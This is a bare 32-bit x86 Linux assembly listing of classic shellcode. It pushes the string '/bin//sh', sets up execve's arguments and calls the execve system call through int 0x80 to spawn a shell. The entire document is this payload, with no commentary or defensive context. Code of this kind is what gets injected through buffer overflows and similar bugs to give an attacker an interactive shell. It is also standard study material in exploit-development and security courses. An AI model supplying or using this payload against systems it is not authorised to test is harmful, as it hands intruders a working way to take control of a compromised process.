bits 32
xor eax, eax
push eax
push 0x68732f2f
push DWORD 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
cdq
mov al, 0x0b
int 0x80
